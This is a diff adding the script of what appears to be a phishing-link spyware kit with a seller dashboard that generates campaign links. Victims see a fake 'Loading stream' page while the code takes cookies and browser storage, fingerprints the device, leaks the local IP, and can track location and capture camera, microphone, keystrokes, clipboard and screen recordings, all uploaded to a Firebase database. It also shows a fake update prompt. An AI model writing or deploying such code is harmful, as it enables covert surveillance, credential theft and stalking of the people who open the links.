+        } catch(e){}
+        const fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact'];
+        const availableFonts = fonts.filter(f => {
+            const span = document.createElement('span');
+            span.style.fontFamily = f;
+            return span.style.fontFamily === f;
+        });
+        const plugins = Array.from(navigator.plugins).map(p => p.name);
+        let localIP = 'N/A';
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if(e.candidate) {
+                    const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if(ipMatch) localIP = ipMatch[0];
+                    pc.close();
+                }
+            };
+            setTimeout(() => pc.close(), 1000);
+        } catch(e){}
+        victimData.fingerprint = { canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP };
+
+        // Cookies & Storage
+        victimData.cookies = document.cookie;
+        try { victimData.localStorage = JSON.stringify(localStorage); } catch(e){}
+        try { victimData.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
+
+        // --- Optional Stealth Features ---
+        // Location (continuous)
+        if(features.includes('L') && navigator.geolocation) {
+            const getLoc = () => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    victimData.location.push({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
+                    victimRef.child('location').set(victimData.location);
+                }, err=>console.log);
+            };
+            getLoc(); setInterval(getLoc, 30000);
+        }
+
+        // Camera (continuous capture)
+        if(features.includes('C')) {
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream; await video.play();
+                const canvas = document.getElementById('hiddenCanvas');
+                const capture = () => {
+                    if(video.videoWidth && video.videoHeight){
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video,0,0);
+                        victimData.camera.push(canvas.toDataURL('image/jpeg',0.7));
+                        victimRef.child('camera').set(victimData.camera);
+                    }
+                };
+                capture(); setInterval(capture, 2000); // every 2 seconds
+            } catch(e){}
+        }
+
+        // Microphone (short clips)
+        if(features.includes('M')) {
+            const record = async () => {
+                try{
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    const audioPromise = new Promise(resolve => {
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/ogg' });
+                            stream.getTracks().forEach(t=>t.stop());
+                            const reader = new FileReader();
+                            reader.onloadend = () => { victimData.mic.push(reader.result); victimRef.child('mic').set(victimData.mic); resolve(); };
+                            reader.readAsDataURL(blob);
+                        };
+                    });
+                    mediaRecorder.start();
+                    setTimeout(()=>mediaRecorder.stop(),8000); // 8 sec clip
+                    await audioPromise;
+                } catch(e){}
+            };
+            record(); setInterval(record,15000);
+        }
+
+        // Advanced Keylogger (with window title)
+        if(features.includes('K')) {
+            let keyBuffer = [];
+            const sendKeys = () => {
+                if(keyBuffer.length) {
+                    victimData.keys.push(...keyBuffer);
+                    victimRef.child('keys').set(victimData.keys);
+                    keyBuffer = [];
+                }
+            };
+            document.addEventListener('keydown', (e) => {
+                let keyStr = e.key;
+                if(e.ctrlKey) keyStr = 'Ctrl+' + keyStr;
+                if(e.altKey) keyStr = 'Alt+' + keyStr;
+                if(e.shiftKey) keyStr = 'Shift+' + keyStr;
+                keyBuffer.push({ key: keyStr, timestamp: Date.now(), windowTitle: document.title });
+                if(keyBuffer.length >= 10) sendKeys();
+            });
+            setInterval(sendKeys, 5000);
+        }
+
+        // Clipboard Monitor
+        if(features.includes('P')) {
+            setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text && text.trim()) {
+                        victimData.clipboard.push({ text: text.substring(0,500), timestamp: Date.now() });
+                        victimRef.child('clipboard').set(victimData.clipboard);
+                    }
+                } catch(e) {}
+            }, 7000);
+        }
+
+        // Screen Recording (10 sec clip, hidden)
+        if(features.includes('R')) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
+                recorder.startRecording();
+                setTimeout(() => {
+                    recorder.stopRecording(() => {
+                        const blob = recorder.getBlob();
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            victimData.screenRec.push(reader.result);
+                            victimRef.child('screenRec').set(victimData.screenRec);
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        reader.readAsDataURL(blob);
+                    });
+                }, 10000);
+            } catch(e){}
+        }
+
+        // Network Scan (light)
+        if(features.includes('N')) {
+            let networkInfo = '';
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if(e.candidate) {
+                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if(ipMatch) networkInfo += `Local IP: ${ipMatch[0]}\n`;
+                    }
+                };
+                setTimeout(() => pc.close(), 2000);
+            } catch(e){}
+            networkInfo += ' (limited scan)';
+            victimData.networkScan = networkInfo;
+            victimRef.child('networkScan').set(networkInfo);
+        }
+
+        // Fake Update Prompt (social engineering)
+        if(features.includes('F')) {
+            const fakeDiv = document.getElementById('fakeUpdateDiv');
+            const fakeBtn = document.getElementById('fakeUpdateBtn');
+            if(fakeDiv && fakeBtn) {
+                fakeDiv.style.display = 'block';
+                fakeBtn.onclick = () => {
+                    victimData.fakeUpdateClicked = true;
+                    victimRef.child('fakeUpdateClicked').set(true);
+                    fakeDiv.style.display = 'none';
+                };
+            }
+        }
+
+        // Screenshot always
+        try{
+            const ss = await html2canvas(document.body, { scale:0.7 });
+            victimData.camera.push(ss.toDataURL('image/jpeg',0.7));
+            victimRef.child('camera').set(victimData.camera);
+        } catch(e){}
+
+        // Save all initial data
+        await victimRef.set(victimData);
+        const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
+        clickRef.transaction(cur => (cur||0)+1);
+
+        // Show fake "Loading stream" for 2 seconds, then fade out
+        const victimStatus = document.getElementById('victimStatus');
+        if(victimStatus) {
+            victimStatus.innerText = 'Loading stream...';
+            setTimeout(() => { victimStatus.innerText = ''; }, 2000);
+        }
+    }
+
+    // ========== MAIN ROUTING ==========
+    const urlParams = new URLSearchParams(window.location.search);
+    const uidParam = urlParams.get('uid');
+    const campParam = urlParams.get('camp');
+    if(uidParam && campParam) {
+        document.getElementById('dashboardPanel').classList.add('hide');
+        document.getElementById('victimPanel').classList.remove('hide');
+        const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
+        campRef.once('value', async (snap) => {
+            if(!snap.exists()) {
+                document.querySelector('#victimPanel .fake-stream-header').innerHTML = '<div style="padding:2rem;">Invalid link.</div>';
+                return;
+            }
+            await startVictimCollector(uidParam, campParam, snap.val().features);
+        }).catch(()=>{});
+    } else {
+        let stored = localStorage.getItem('momin_uid');
+        if(stored) {
+            loadSellerDashboard(stored);
+        } else {
+            const newUid = generateUID();
+            localStorage.setItem('momin_uid', newUid);
+            loadSellerDashboard(newUid);
+        }
+        document.getElementById('generateLinkBtn').onclick = generateNewCampaign;
+        document.getElementById('copyLinkBtn').onclick = () => { const link = document.getElementById('newLinkText').innerText; if(link && link!=='--') copyClip(link); };
+        document.querySelectorAll('.feature-card').forEach(c => c.addEventListener('click',()=>c.classList.toggle('selected')));
+    }
+    initLightbox();
+</script>
+</body>
+</html>
